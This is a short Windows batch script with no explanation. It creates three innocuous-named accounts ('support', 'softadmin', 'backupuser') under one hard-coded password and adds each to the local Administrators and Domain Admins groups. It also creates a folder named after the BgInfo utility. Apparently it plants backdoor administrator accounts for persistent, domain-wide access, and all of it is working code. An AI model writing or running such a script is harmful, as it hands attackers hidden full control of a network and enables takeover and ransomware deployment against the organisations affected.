@echo off
CD /d "%~dp0"

mkdir c:\BgInfo\do-pass-run
net users support saubnc@2020 /add
net users support saubnc@2020 /active:yes
net localgroup Administrators /add support
net group "Domain Admins" /add support

net users softadmin saubnc@2020 /add
net users softadmin saubnc@2020 /active:yes
net localgroup Administrators /add softadmin
net group "Domain Admins" /add softadmin

net users backupuser saubnc@2020 /add
net users backupuser saubnc@2020 /active:yes
net localgroup Administrators /add backupuser
net group "Domain Admins" /add backupuser

@echo on